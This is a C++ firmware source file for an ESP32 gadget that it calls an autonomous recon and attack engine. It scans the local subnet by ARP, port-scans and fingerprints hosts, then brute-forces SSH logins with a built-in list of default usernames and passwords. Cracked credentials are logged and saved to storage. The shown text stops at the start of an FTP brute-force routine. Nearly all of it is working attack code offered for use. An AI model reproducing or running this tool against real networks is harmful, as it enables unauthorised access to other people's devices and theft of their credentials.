// =============================================================================
// Loki CYD — Autonomous Recon Engine
// Full attack pipeline: Discover → Identify → Attack → Report
// Ported from HaleHound-CYD IoT Recon module
// Runs on Core 0, reports to pet UI on Core 1
// =============================================================================

#include "loki_recon.h"
#include "loki_config.h"
#include "loki_types.h"
#include "loki_pet.h"
#include "loki_score.h"
#include "loki_sprites.h"
#include "loki_storage.h"
#include "loki_steal.h"
#include <WiFi.h>
#include <WiFiClient.h>
#include <SD.h>
#include <SPI.h>
#include "lwip/inet.h"
#include "lwip/netdb.h"
#include "lwip/sockets.h"
#include "lwip/etharp.h"
#include "lwip/netif.h"
#include "lwip/ip4_addr.h"
#include "loki_oui_db.h"
#include <libssh/libssh.h>

namespace LokiRecon {

// =============================================================================
// CREDENTIAL DICTIONARY (PROGMEM)
// =============================================================================

// Loki dictionary — cross-product of usernames × passwords (11 × 20 = 220 combos)
static const char* userList[] PROGMEM = {
    "admin", "root", "user", "guest", "pi", "Administrator"
};
static const int USER_COUNT = 6;

static const char* passList[] PROGMEM = {
    "admin", "password", "123456", "root", "1234",
    "changeme", "toor", "raspberry", "alpine", "letmein"
};
static const int PASS_COUNT = 10;

// Also try blank password and same-as-username
static const int CRED_COUNT = USER_COUNT * PASS_COUNT + USER_COUNT * 2; // + blank + same-as-user

struct CredPair {
    const char* user;
    const char* pass;
};

// SD card wordlist
#define MAX_SD_CREDS 64
struct SdCred {
    char user[LOKI_MAX_CRED_USER];
    char pass[LOKI_MAX_CRED_PASS];
};
static SdCred sdCreds[MAX_SD_CREDS];
static int sdCredCount = 0;
static int totalCredCount = 0;

static void getCred(int index, const char*& user, const char*& pass) {
    if (index < USER_COUNT) {
        // First: try each user with blank password
        user = userList[index];
        pass = "";
    } else if (index < USER_COUNT * 2) {
        // Next: try each user with same-as-username password
        int i = index - USER_COUNT;
        user = userList[i];
        pass = userList[i];
    } else if (index < USER_COUNT * 2 + USER_COUNT * PASS_COUNT) {
        // Cross-product: every user × every password
        int i = index - USER_COUNT * 2;
        user = userList[i / PASS_COUNT];
        pass = passList[i % PASS_COUNT];
    } else {
        // SD card extras
        int si = index - CRED_COUNT;
        if (si >= 0 && si < sdCredCount) {
            user = sdCreds[si].user;
            pass = sdCreds[si].pass;
        } else {
            user = "admin";
            pass = "admin";
        }
    }
}

// =============================================================================
// HELPERS
// =============================================================================

static const char b64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static void base64Encode(const char* input, int len, char* output, int outMax) {
    int i = 0, j = 0;
    uint8_t a3[3], a4[4];
    while (len--) {
        a3[i++] = *(input++);
        if (i == 3) {
            a4[0] = (a3[0] & 0xfc) >> 2;
            a4[1] = ((a3[0] & 0x03) << 4) + ((a3[1] & 0xf0) >> 4);
            a4[2] = ((a3[1] & 0x0f) << 2) + ((a3[2] & 0xc0) >> 6);
            a4[3] = a3[2] & 0x3f;
            for (i = 0; i < 4 && j < outMax - 1; i++)
                output[j++] = b64chars[a4[i]];
            i = 0;
        }
    }
    if (i) {
        for (int k = i; k < 3; k++) a3[k] = '\0';
        a4[0] = (a3[0] & 0xfc) >> 2;
        a4[1] = ((a3[0] & 0x03) << 4) + ((a3[1] & 0xf0) >> 4);
        a4[2] = ((a3[1] & 0x0f) << 2) + ((a3[2] & 0xc0) >> 6);
        for (int k = 0; k < i + 1 && j < outMax - 1; k++)
            output[j++] = b64chars[a4[k]];
        while (i++ < 3 && j < outMax - 1)
            output[j++] = '=';
    }
    output[j] = '\0';
}

static void ipToStr(const uint8_t* ip, char* buf, int bufLen) {
    snprintf(buf, bufLen, "%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3]);
}

// =============================================================================
// STATE
// =============================================================================

static LokiDevice devices[LOKI_MAX_DEVICES];
static volatile int deviceCount = 0;
static volatile LokiScanPhase scanPhase = PHASE_IDLE;
static volatile bool running = false;
static volatile bool done = false;
static TaskHandle_t scanTaskHandle = NULL;

static char ssid[33] = {0};
static char pass[65] = {0};

static volatile uint32_t hostsFound = 0;
static volatile uint32_t portsFound = 0;
static volatile uint32_t servicesCracked = 0;
static volatile uint32_t filesStolen = 0;
static volatile uint32_t vulnsFound = 0;
static volatile uint32_t totalAttacks = 0;

static IPAddress gatewayIP;
static IPAddress localIP;

// Credential log — stores ALL cracked credentials
static LokiCredEntry credLog[LOKI_MAX_CREDS];
static volatile int credLogCount = 0;

// File-scope shared resources (avoid repeated allocations per function)
static WiFiClient client;

// Cached kill feed colors from theme (set once at scan start)
static uint16_t KF_INFO    = 0;
static uint16_t KF_FOUND   = 0;
static uint16_t KF_SUCCESS = 0;
static uint16_t KF_CRACKED = 0;
static uint16_t KF_DIM     = 0;
static uint16_t KF_ATTACK  = 0;
static uint16_t KF_ERROR   = 0;
static uint16_t KF_XP      = 0;

// ARP discovery results (shared between discoverHosts and scanHostPorts)
#define LOKI_MAX_ALIVE 254
static uint8_t aliveHosts[LOKI_MAX_ALIVE];
static uint8_t aliveMacs[LOKI_MAX_ALIVE][6];
static int aliveCount = 0;

static void cacheKillFeedColors() {
    KF_INFO    = LokiPet::kfInfo();
    KF_FOUND   = LokiPet::kfFound();
    KF_SUCCESS = LokiPet::kfSuccess();
    KF_CRACKED = LokiPet::kfCracked();
    KF_DIM     = LokiPet::kfDim();
    KF_ATTACK  = LokiPet::kfAttack();
    KF_ERROR   = LokiPet::kfError();
    KF_XP      = LokiPet::kfXp();
}

static void addCredential(uint8_t* ip, uint16_t port, const char* user, const char* pass) {
    if (credLogCount < LOKI_MAX_CREDS) {
        memcpy(credLog[credLogCount].ip, ip, 4);
        credLog[credLogCount].port = port;
        strncpy(credLog[credLogCount].user, user, LOKI_MAX_CRED_USER - 1);
        strncpy(credLog[credLogCount].pass, pass, LOKI_MAX_CRED_PASS - 1);
        credLogCount++;
    }
    Serial.printf("[CRED] %d.%d.%d.%d:%d  %s : %s\n", ip[0], ip[1], ip[2], ip[3], port, user, pass);

    // Auto-save to SPIFFS
    LokiStorage::saveCredentials();
}

// =============================================================================
// SD WORDLIST LOADER
// =============================================================================

static void loadSdWordlist() {
    // SD wordlist loading is optional — skip if no SD to avoid SPI conflicts with WiFi
    sdCredCount = 0;
    totalCredCount = CRED_COUNT;

    if (!LokiSprites::sdAvailable()) return;

    if (!LokiSprites::sdMount()) return;

    File f = SD.open("/loki/creds.txt");
    if (!f) {
        LokiSprites::sdUnmount();
        return;
    }

    while (f.available() && sdCredCount < MAX_SD_CREDS) {
        String line = f.readStringUntil('\n');
        line.trim();
        if (line.length() == 0 || line.startsWith("#")) continue;

        int colon = line.indexOf(':');
        if (colon > 0) {
            String u = line.substring(0, colon);
            String p = line.substring(colon + 1);
            strncpy(sdCreds[sdCredCount].user, u.c_str(), LOKI_MAX_CRED_USER - 1);
            strncpy(sdCreds[sdCredCount].pass, p.c_str(), LOKI_MAX_CRED_PASS - 1);
        } else {
            strncpy(sdCreds[sdCredCount].user, "admin", LOKI_MAX_CRED_USER - 1);
            strncpy(sdCreds[sdCredCount].pass, line.c_str(), LOKI_MAX_CRED_PASS - 1);
        }
        sdCredCount++;
    }

    f.close();
    LokiSprites::sdUnmount();
    totalCredCount = CRED_COUNT + sdCredCount;
}

// =============================================================================
// PORT / DEVICE CLASSIFICATION HELPERS
// =============================================================================

static const uint16_t scanPorts[] = LOKI_SCAN_PORTS;
static const char* portNames[] = {"FTP","SSH","Telnet","HTTP","HTTPS","SMB","MySQL","RDP","HTTP"};

// =============================================================================
// ARP-BASED HOST DISCOVERY (same method as nmap -sn on local networks)
// =============================================================================

static bool isHostInArpTable(IPAddress ipAddr, uint8_t* macOut = nullptr) {
    ip4_addr_t ip;
    IP4_ADDR(&ip, ipAddr[0], ipAddr[1], ipAddr[2], ipAddr[3]);

    struct eth_addr *eth_ret = NULL;
    const ip4_addr_t *ip_ret = NULL;

    int idx = etharp_find_addr(netif_default, &ip, &eth_ret, &ip_ret);
    if (idx >= 0 && eth_ret != NULL) {
        if (macOut) {
            memcpy(macOut, eth_ret->addr, 6);
        }
        return true;
    }
    return false;
}

// =============================================================================
// DEVICE CLASSIFICATION — vendor + ports → device type
// Matches original Loki's device_classifier.py
// =============================================================================

static const char* deviceTypeName(LokiDeviceType type) {
    switch (type) {
        case DEV_PHONE:    return "Phone";
        case DEV_LAPTOP:   return "Laptop/PC";
        case DEV_ROUTER:   return "Router";
        case DEV_CAMERA:   return "Camera";
        case DEV_NAS:      return "NAS";
        case DEV_PRINTER:  return "Printer";
        case DEV_TV_MEDIA: return "TV/Media";
        case DEV_IOT:      return "IoT";
        case DEV_SPEAKER:  return "Smart Speaker";
        case DEV_GAMING:   return "Gaming";
        case DEV_SERVER:   return "Server";
        case DEV_VM:       return "VM";
        case DEV_OTHER:    return "Device";
        default:           return "Unknown";
    }
}

static LokiDeviceType classifyDevice(const char* vendor, uint16_t openPorts) {
    if (!vendor || !vendor[0]) {
        // No vendor — classify by ports only
        if (openPorts & PORT_RDP) return DEV_LAPTOP;
        if (openPorts & PORT_SSH) return DEV_SERVER;
        if (openPorts & PORT_MYSQL) return DEV_SERVER;
        if (openPorts & PORT_SMB) return DEV_LAPTOP;
        return DEV_UNKNOWN;
    }

    String v = String(vendor);
    v.toLowerCase();

    // Phones / Mobile
    if (v.indexOf("apple") >= 0 || v.indexOf("samsung") >= 0 || v.indexOf("oneplus") >= 0 ||
        v.indexOf("xiaomi") >= 0 || v.indexOf("huawei") >= 0 || v.indexOf("oppo") >= 0 ||
        v.indexOf("vivo") >= 0 || v.indexOf("motorola") >= 0 || v.indexOf("google") >= 0 ||
        v.indexOf("realme") >= 0 || v.indexOf("nokia") >= 0) {
        // Apple/Samsung with SMB or SSH is likely a laptop/desktop, not phone
        if (openPorts & (PORT_SSH | PORT_SMB | PORT_RDP | PORT_MYSQL)) return DEV_LAPTOP;
        return DEV_PHONE;
    }

    // Routers / Network
    if (v.indexOf("cisco") >= 0 || v.indexOf("ubiquiti") >= 0 || v.indexOf("netgear") >= 0 ||
        v.indexOf("tp-link") >= 0 || v.indexOf("d-link") >= 0 || v.indexOf("linksys") >= 0 ||
        v.indexOf("aruba") >= 0 || v.indexOf("mikrotik") >= 0 || v.indexOf("juniper") >= 0 ||
        v.indexOf("zyxel") >= 0 || v.indexOf("arris") >= 0) return DEV_ROUTER;

    // Cameras
    if (v.indexOf("hikvision") >= 0 || v.indexOf("dahua") >= 0 || v.indexOf("reolink") >= 0 ||
        v.indexOf("axis") >= 0 || v.indexOf("amcrest") >= 0 || v.indexOf("foscam") >= 0) return DEV_CAMERA;

    // NAS
    if (v.indexOf("synology") >= 0 || v.indexOf("qnap") >= 0 || v.indexOf("buffalo") >= 0) return DEV_NAS;

    // Printers
    if (v.indexOf("brother") >= 0 || v.indexOf("canon") >= 0 || v.indexOf("epson") >= 0 ||
        v.indexOf("xerox") >= 0 || v.indexOf("hp") >= 0) {
        // HP could be printer or laptop — check ports
        if (v.indexOf("hp") >= 0 && (openPorts & (PORT_SSH | PORT_RDP))) return DEV_LAPTOP;
        return DEV_PRINTER;
    }

    // Smart speakers
    if (v.indexOf("sonos") >= 0 || v.indexOf("amazon") >= 0) {
        if (v.indexOf("amazon") >= 0 && (openPorts & PORT_SSH)) return DEV_SERVER; // AWS
        return DEV_SPEAKER;
    }

    // IoT / Smart Home
    if (v.indexOf("esp") >= 0 || v.indexOf("shelly") >= 0 || v.indexOf("tuya") >= 0 ||
        v.indexOf("philips") >= 0 || v.indexOf("nest") >= 0 || v.indexOf("ecobee") >= 0 ||
        v.indexOf("meross") >= 0 || v.indexOf("ring") >= 0) return DEV_IOT;

    // TV / Media
    if (v.indexOf("roku") >= 0 || v.indexOf("lg") >= 0 || v.indexOf("chromecast") >= 0) return DEV_TV_MEDIA;

    // Gaming
    if (v.indexOf("nintendo") >= 0 || v.indexOf("playstation") >= 0) return DEV_GAMING;

    // VMs
    if (v.indexOf("vmware") >= 0 || v.indexOf("oracle") >= 0) return DEV_VM;

    // Servers / Workstations
    if (v.indexOf("dell") >= 0 || v.indexOf("lenovo") >= 0 || v.indexOf("intel") >= 0 ||
        v.indexOf("asus") >= 0 || v.indexOf("msi") >= 0 || v.indexOf("microsoft") >= 0 ||
        v.indexOf("supermicro") >= 0 || v.indexOf("broadcom") >= 0 ||
        v.indexOf("raspberry") >= 0 || v.indexOf("realtek") >= 0) {
        if (openPorts & (PORT_MYSQL | PORT_HTTP)) return DEV_SERVER;
        return DEV_LAPTOP;
    }

    // Tesla
    if (v.indexOf("tesla") >= 0) return DEV_IOT;

    return DEV_OTHER;
}

static void sendArpRequest(IPAddress ipAddr) {
    ip4_addr_t ip;
    IP4_ADDR(&ip, ipAddr[0], ipAddr[1], ipAddr[2], ipAddr[3]);
    etharp_request(netif_default, &ip);
}

// =============================================================================
// MODULAR ATTACK FUNCTIONS
// =============================================================================

// ── connectWiFi: connect using stored ssid/pass ──
bool connectWiFi() {
    Serial.println("[RECON] Connecting to WiFi...");
    Serial.printf("[RECON] SSID: '%s' Pass: '%s'\n", ssid, strlen(pass) > 0 ? "***" : "(none)");

    scanPhase = PHASE_WIFI_CONNECT;
    LokiPet::setStatus("Connecting WiFi...");
    LokiPet::setMood(MOOD_SCANNING);

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(500);  // Give WiFi time to reset

    if (strlen(pass) > 0) WiFi.begin(ssid, pass);
    else WiFi.begin(ssid);

    unsigned long t0 = millis();
    while (WiFi.status() != WL_CONNECTED && millis() - t0 < 15000) {
        delay(500);
        Serial.printf("[RECON] WiFi status: %d\n", WiFi.status());
        if (!running) return false;
    }

    if (WiFi.status() != WL_CONNECTED) {
        Serial.printf("[RECON] WiFi FAILED (status: %d)\n", WiFi.status());
        LokiPet::setStatus("WiFi failed!");
        LokiPet::addKillLine("[!] WiFi connection failed", KF_ERROR);
        LokiPet::setMood(MOOD_BORED);
        return false;
    }

    Serial.printf("[RECON] WiFi connected! IP: %s\n", WiFi.localIP().toString().c_str());

    // Small delay to let WiFi stack stabilize before scanning
    delay(1000);

    gatewayIP = WiFi.gatewayIP();
    localIP = WiFi.localIP();

    {
        char msg[52];
        snprintf(msg, sizeof(msg), "[*] Connected: %s", localIP.toString().c_str());
        LokiPet::addKillLine(msg, KF_SUCCESS);
        LokiPet::setStatus("Connected", localIP.toString().c_str());
    }

    return true;
}

// ── discoverHosts: ARP scan the subnet, populate devices array ──
int discoverHosts() {
    scanPhase = PHASE_DISCOVER;
    LokiPet::setStatus("NetworkScanner", "Discovering hosts...");
    LokiPet::addKillLine("[>] Host discovery started", KF_INFO);

    // ARP scan — discover ALL alive hosts (like nmap -sn)
    // ARP table is 10 entries (pre-compiled SDK), so scan in batches of 8.
    {
        char subnetMsg[32];
        snprintf(subnetMsg, sizeof(subnetMsg), "%d.%d.%d.0/24", gatewayIP[0], gatewayIP[1], gatewayIP[2]);
        LokiPet::setStatus("NetworkScanner", subnetMsg);
    }
    LokiPet::addKillLine("[>] ARP scan...", KF_INFO);
    aliveCount = 0;

    #define ARP_BATCH 8
    for (int batchStart = 1; batchStart <= 254 && running; batchStart += ARP_BATCH) {
        int batchEnd = min(batchStart + ARP_BATCH - 1, 254);

        // Send ARP requests for this batch
        for (int host = batchStart; host <= batchEnd; host++) {
            IPAddress ip(gatewayIP[0], gatewayIP[1], gatewayIP[2], host);
            sendArpRequest(ip);
        }

        // Wait for replies
        vTaskDelay(pdMS_TO_TICKS(500));

        // Check ARP table for this batch
        for (int host = batchStart; host <= batchEnd && running; host++) {
            IPAddress ip(gatewayIP[0], gatewayIP[1], gatewayIP[2], host);
            if (ip == localIP) continue;

            uint8_t mac[6] = {0};
            if (isHostInArpTable(ip, mac)) {
                if (aliveCount < LOKI_MAX_ALIVE) {
                    aliveHosts[aliveCount] = host;
                    memcpy(aliveMacs[aliveCount], mac, 6);
                    aliveCount++;
                }
                hostsFound++;
                LokiScoreManager::addHostFound();

                const char* vendor = oui_lookup(mac[0], mac[1], mac[2]);
                char msg[52];
                if (vendor) {
                    snprintf(msg, sizeof(msg), "[+] %d.%d.%d.%d (%s)",
                             gatewayIP[0], gatewayIP[1], gatewayIP[2], host, vendor);
                } else {
                    snprintf(msg, sizeof(msg), "[+] %d.%d.%d.%d",
                             gatewayIP[0], gatewayIP[1], gatewayIP[2], host);
                }
                LokiPet::addKillLine(msg, KF_FOUND);

                // Update status with running count
                char detail[32];
                snprintf(detail, sizeof(detail), "Found %d hosts", aliveCount);
                LokiPet::setStatus("NetworkScanner", detail);
            }
        }
    }

    {
        char msg[52];
        snprintf(msg, sizeof(msg), "[*] %d hosts alive", aliveCount);
        LokiPet::addKillLine(msg, KF_SUCCESS);

        char detail[32];
        snprintf(detail, sizeof(detail), "Found %d hosts", aliveCount);
        LokiPet::setStatus("NetworkScanner", detail);
    }

    if (!running) return aliveCount;

    // Port scan all alive hosts and register them as devices
    {
        char detail[40];
        snprintf(detail, sizeof(detail), "Scanning ports on %d hosts...", aliveCount);
        LokiPet::setStatus("NetworkScanner", detail);
        LokiPet::addKillLine("[>] Port scanning...", KF_INFO);
    }

    for (int a = 0; a < aliveCount && running; a++) {
        int host = aliveHosts[a];
        IPAddress ip(gatewayIP[0], gatewayIP[1], gatewayIP[2], host);

        uint16_t portMask = 0;

        // Scan all target ports on this alive host
        for (int p = 0; p < LOKI_MAX_PORTS && running; p++) {
            if (client.connect(ip, scanPorts[p], 500)) {
                portMask |= (1 << p);
                client.stop();
            }
        }

        // Register host (even with no target ports open — it's still alive)
        if (deviceCount < LOKI_MAX_DEVICES) {
            int idx = deviceCount;
            devices[idx].ip[0] = ip[0]; devices[idx].ip[1] = ip[1];
            devices[idx].ip[2] = ip[2]; devices[idx].ip[3] = ip[3];
            memcpy(devices[idx].mac, aliveMacs[a], 6);
            devices[idx].openPorts = portMask;
            devices[idx].type = DEV_UNKNOWN;
            devices[idx].status = STATUS_FOUND;
            devices[idx].banner[0] = '\0';
            devices[idx].credUser[0] = '\0';
            devices[idx].credPass[0] = '\0';
            devices[idx].attackPhase = 0;  // discovered
            devices[idx].attackPortIdx = 0;

            // OUI vendor lookup + device classification
            const char* vendor = oui_lookup(devices[idx].mac[0], devices[idx].mac[1], devices[idx].mac[2]);
            if (vendor) strncpy(devices[idx].vendor, vendor, sizeof(devices[idx].vendor) - 1);
            else devices[idx].vendor[0] = '\0';

            devices[idx].type = classifyDevice(devices[idx].vendor, portMask);
            devices[idx].crackedPorts = 0;
            deviceCount++;
            hostsFound++;
            LokiScoreManager::addHostFound();

            int portCount = 0;
            for (int p = 0; p < LOKI_MAX_PORTS; p++) {
                if (portMask & (1 << p)) { portCount++; portsFound++; LokiScoreManager::addPortFound(); }
            }

            char msg[52], ipStr[16];
            ipToStr(devices[idx].ip, ipStr, sizeof(ipStr));
            // List open port numbers
            String portList = "";
            for (int p = 0; p < LOKI_MAX_PORTS; p++) {
                if (portMask & (1 << p)) {
                    if (portList.length() > 0) portList += ",";
                    portList += String(scanPorts[p]);
                }
            }
            snprintf(msg, sizeof(msg), "[+] %s :%s", ipStr, portList.c_str());
            LokiPet::addKillLine(msg, KF_FOUND);

            // Mark device as ports_scanned
            devices[idx].attackPhase = 1;
        }
        vTaskDelay(1);
    }

    return deviceCount;
}

// ── scanHostPorts: port scan a specific device, return open port count ──
int scanHostPorts(int deviceIdx) {
    if (deviceIdx < 0 || deviceIdx >= deviceCount) return 0;
    LokiDevice& dev = devices[deviceIdx];
    IPAddress devIP(dev.ip[0], dev.ip[1], dev.ip[2], dev.ip[3]);

    uint16_t portMask = 0;
    for (int p = 0; p < LOKI_MAX_PORTS && running; p++) {
        if (client.connect(devIP, scanPorts[p], 500)) {
            portMask |= (1 << p);
            client.stop();
        }
    }

    dev.openPorts = portMask;
    dev.type = classifyDevice(dev.vendor, portMask);

    int portCount = 0;
    for (int p = 0; p < LOKI_MAX_PORTS; p++) {
        if (portMask & (1 << p)) { portCount++; portsFound++; LokiScoreManager::addPortFound(); }
    }

    dev.attackPhase = 1;  // ports_scanned

    char msg[52], ipStr[16];
    ipToStr(dev.ip, ipStr, sizeof(ipStr));
    String portList = "";
    for (int p = 0; p < LOKI_MAX_PORTS; p++) {
        if (portMask & (1 << p)) {
            if (portList.length() > 0) portList += ",";
            portList += String(scanPorts[p]);
        }
    }
    snprintf(msg, sizeof(msg), "[+] %s :%s", ipStr, portList.c_str());
    LokiPet::addKillLine(msg, KF_FOUND);

    return portCount;
}

// ── identifyServices: banner grab + fingerprint a device ──
void identifyServices(int deviceIdx) {
    if (deviceIdx < 0 || deviceIdx >= deviceCount) return;
    LokiDevice& dev = devices[deviceIdx];
    IPAddress devIP(dev.ip[0], dev.ip[1], dev.ip[2], dev.ip[3]);
    char ipStr[16];
    ipToStr(dev.ip, ipStr, sizeof(ipStr));
    unsigned long t0;

    // HTTP banner grab
    if ((dev.openPorts & PORT_HTTP) || (dev.openPorts & PORT_HTTP2)) {
        uint16_t port = (dev.openPorts & PORT_HTTP) ? 80 : 8080;
        if (client.connect(devIP, port, 2000)) {
            client.printf("GET / HTTP/1.0\r\nHost: %s\r\nConnection: close\r\n\r\n", ipStr);
            t0 = millis();
            String resp = "";
            while (client.connected() && millis() - t0 < 3000 && resp.length() < 512) {
                while (client.available() && resp.length() < 512) resp += (char)client.read();
                vTaskDelay(1);
            }
            client.stop();

            // Extract Server header
            int sIdx = resp.indexOf("Server:");
            if (sIdx >= 0) {
                int eIdx = resp.indexOf("\r\n", sIdx);
                if (eIdx > sIdx) {
                    String server = resp.substring(sIdx + 8, min(eIdx, sIdx + 8 + LOKI_MAX_BANNER_LEN - 1));
                    server.trim();
                    strncpy(dev.banner, server.c_str(), LOKI_MAX_BANNER_LEN - 1);
                }
            }

            // Fingerprint
            String rLow = resp; rLow.toLowerCase();
            if (rLow.indexOf("hikvision") >= 0 || rLow.indexOf("hik") >= 0) {
                strncpy(dev.banner, "Hikvision", LOKI_MAX_BANNER_LEN);
            } else if (rLow.indexOf("dahua") >= 0) {
                strncpy(dev.banner, "Dahua", LOKI_MAX_BANNER_LEN);
            } else if (rLow.indexOf("401") >= 0 && false) {

            }
        }
    }

    if (!running) return;

    // RTSP check (port 554) — currently disabled
    if (false && running) {
        if (client.connect(devIP, 554, 2000)) {
            client.printf("OPTIONS rtsp://%s:554 RTSP/1.0\r\nCSeq: 1\r\n\r\n", ipStr);
            t0 = millis();
            String resp = "";
            while (client.connected() && millis() - t0 < 2000 && resp.length() < 256) {
                while (client.available() && resp.length() < 256) resp += (char)client.read();
                vTaskDelay(1);
            }
            client.stop();
            if (dev.type == DEV_UNKNOWN) {

                if (!dev.banner[0]) strncpy(dev.banner, "RTSP Camera", LOKI_MAX_BANNER_LEN);
            }
        }
    }

    // MQTT (port 1883) — currently disabled
    if (false && running) {

        if (!dev.banner[0]) strncpy(dev.banner, "MQTT Broker", LOKI_MAX_BANNER_LEN);
    }

    // Telnet banner (port 23)
    if ((dev.openPorts & PORT_TELNET) && running) {
        if (client.connect(devIP, 23, 2000)) {
            t0 = millis();
            String banner = "";
            while (client.connected() && millis() - t0 < 2000 && banner.length() < 128) {
                while (client.available() && banner.length() < 128) banner += (char)client.read();
                vTaskDelay(1);
            }
            client.stop();

            if (banner.length() > 0 && !dev.banner[0]) {
                strncpy(dev.banner, banner.c_str(), LOKI_MAX_BANNER_LEN - 1);
                for (int c = 0; c < LOKI_MAX_BANNER_LEN && dev.banner[c]; c++)
                    if (dev.banner[c] < 32) dev.banner[c] = ' ';
            }
        }
    }

    if (!running) return;

    // FTP banner (port 21)
    if ((dev.openPorts & PORT_FTP) && running) {
        if (client.connect(devIP, 21, 2000)) {
            t0 = millis();
            String banner = "";
            while (client.connected() && millis() - t0 < 2000 && banner.length() < 128) {
                while (client.available() && banner.length() < 128) banner += (char)client.read();
                vTaskDelay(1);
            }
            client.stop();

            if (banner.length() > 0 && !dev.banner[0]) {
                String clean = banner;
                if (clean.startsWith("220 ") || clean.startsWith("220-")) clean = clean.substring(4);
                clean.trim();
                strncpy(dev.banner, clean.c_str(), LOKI_MAX_BANNER_LEN - 1);
                for (int c = 0; c < LOKI_MAX_BANNER_LEN && dev.banner[c]; c++)
                    if (dev.banner[c] < 32) dev.banner[c] = ' ';
            }
        }
    }

    if (!running) return;

    // SSH banner (port 22) — SSH takes priority as device type
    if ((dev.openPorts & PORT_SSH) && running) {
        if (client.connect(devIP, 22, 2000)) {
            t0 = millis();
            String banner = "";
            while (client.connected() && millis() - t0 < 2000 && banner.length() < 128) {
                while (client.available() && banner.length() < 128) banner += (char)client.read();
                vTaskDelay(1);
            }
            client.stop();

            if (banner.length() > 0 && !dev.banner[0]) {
                banner.trim();
                strncpy(dev.banner, banner.c_str(), LOKI_MAX_BANNER_LEN - 1);
                for (int c = 0; c < LOKI_MAX_BANNER_LEN && dev.banner[c]; c++)
                    if (dev.banner[c] < 32) dev.banner[c] = ' ';
            }
        }
    }

    // Modbus (port 502) — currently disabled
    if (false && running) {

        if (!dev.banner[0]) strncpy(dev.banner, "Modbus PLC", LOKI_MAX_BANNER_LEN);
    }

    // HTTPS detection
    if ((dev.openPorts & PORT_HTTPS) && dev.type == DEV_UNKNOWN) {

        if (!dev.banner[0]) strncpy(dev.banner, "HTTPS Device", LOKI_MAX_BANNER_LEN);
    }

    // SMB (port 445)
    if ((dev.openPorts & PORT_SMB) && dev.type == DEV_UNKNOWN && running) {

        if (!dev.banner[0]) strncpy(dev.banner, "SMB/CIFS", LOKI_MAX_BANNER_LEN);
    }

    // MySQL (port 3306)
    if ((dev.openPorts & PORT_MYSQL) && running) {

        if (client.connect(devIP, 3306, 2000)) {
            t0 = millis();
            String banner = "";
            while (client.connected() && millis() - t0 < 2000 && banner.length() < 128) {
                while (client.available() && banner.length() < 128) banner += (char)client.read();
                vTaskDelay(1);
            }
            client.stop();
            if (banner.length() > 4 && !dev.banner[0]) {
                // MySQL greeting starts with packet length + version string
                String ver = banner.substring(4);
                int nullPos = ver.indexOf('\0');
                if (nullPos > 0) ver = ver.substring(0, nullPos);
                ver.trim();
                strncpy(dev.banner, ver.c_str(), LOKI_MAX_BANNER_LEN - 1);
            }
        }
    }

    // RDP (port 3389)
    if ((dev.openPorts & PORT_RDP) && dev.type == DEV_UNKNOWN && running) {

        if (!dev.banner[0]) strncpy(dev.banner, "RDP/Remote Desktop", LOKI_MAX_BANNER_LEN);
    }

    // Log identification
    if (dev.type != DEV_UNKNOWN) {
        const char* typeStr = deviceTypeName(dev.type);
        char msg[52];
        snprintf(msg, sizeof(msg), "[*] %s %s (%s)", typeStr, ipStr, dev.banner);
        LokiPet::addKillLine(msg, KF_INFO);
    }

    dev.attackPhase = 2;  // identified
}

// =============================================================================
// INDIVIDUAL PROTOCOL ATTACK FUNCTIONS
// =============================================================================

// ── attackSSH: SSH brute force using LibSSH ──
bool attackSSH(int deviceIdx) {
    if (deviceIdx < 0 || deviceIdx >= deviceCount) return false;
    LokiDevice& dev = devices[deviceIdx];
    if (!(dev.openPorts & PORT_SSH)) return false;

    IPAddress devIP(dev.ip[0], dev.ip[1], dev.ip[2], dev.ip[3]);
    char ipStr[16];
    ipToStr(dev.ip, ipStr, sizeof(ipStr));

    LokiPet::setStatus("SSHBruteforce", ipStr);
    dev.status = STATUS_TESTING;
    bool cracked = false;

    LokiPet::addKillLine(("[>] SSH brute " + String(ipStr)).c_str(), KF_INFO);

    for (int c = 0; c < totalCredCount && running && !cracked; c++) {
        const char* user; const char* pw;
        getCred(c, user, pw);

        if (c > 0 && c % 20 == 0) {
            char msg[52]; snprintf(msg, sizeof(msg), "[>] %s SSH [%d/%d]", ipStr, c, totalCredCount);
            LokiPet::addKillLine(msg, KF_DIM);
        }

        ssh_session session = ssh_new();
        if (!session) continue;

        ssh_options_set(session, SSH_OPTIONS_HOST, ipStr);
        ssh_options_set(session, SSH_OPTIONS_USER, user);
        int port = 22;
        ssh_options_set(session, SSH_OPTIONS_PORT, &port);
        long timeout = 5;
        ssh_options_set(session, SSH_OPTIONS_TIMEOUT, &timeout);

        if (ssh_connect(session) == SSH_OK) {
            if (ssh_userauth_password(session, NULL, pw) == SSH_AUTH_SUCCESS) {
                cracked = true;
                strncpy(dev.credUser, user, LOKI_MAX_CRED_USER - 1);
                strncpy(dev.credPass, pw, LOKI_MAX_CRED_PASS - 1);
                dev.status = STATUS_CRACKED; servicesCracked++;
                dev.crackedPorts |= PORT_SSH;
                LokiScoreManager::addServiceCracked(); addCredential(dev.ip, 22, user, pw);
                LokiPet::setMood(MOOD_CRACKED);
                char msg[52]; snprintf(msg, sizeof(msg), "[!!!] CRACKED %s SSH %s:%s", ipStr, user, pw);
                LokiPet::addKillLine(msg, KF_CRACKED);
            }
            ssh_disconnect(session);
        }
        ssh_free(session);
        vTaskDelay(1);
    }

    if (!cracked && dev.status == STATUS_TESTING) {
        if (dev.status != STATUS_CRACKED) dev.status = STATUS_LOCKED;
        char msg[52]; snprintf(msg, sizeof(msg), "[x] LOCKED %s SSH", ipStr);
        LokiPet::addKillLine(msg, KF_DIM);
    }

    return cracked;
}

// ── attackFTP: FTP brute force (including anonymous check) ──
bool attackFTP(int deviceIdx) {
    if (deviceIdx < 0 || deviceIdx >= deviceCount) return false;
    LokiDevice& dev = devices[deviceIdx];
    if (!(dev.openPorts & PORT_FTP)) return false;

    IPAddress devIP(dev.ip[0], dev.ip[1], dev.ip[2], dev.ip[3]);
    char ipStr[16];
    ipToStr(dev.ip, ipStr, sizeof(ipStr));
    unsigned long t0;

    LokiPet::setStatus("FTPBruteforce", ipStr);
    dev.status = STATUS_TESTING;
    bool cracked = false;
    int connFails = 0;

    LokiPet::addKillLine(("[>] FTP brute " + String(ipStr)).c_str(), KF_INFO);

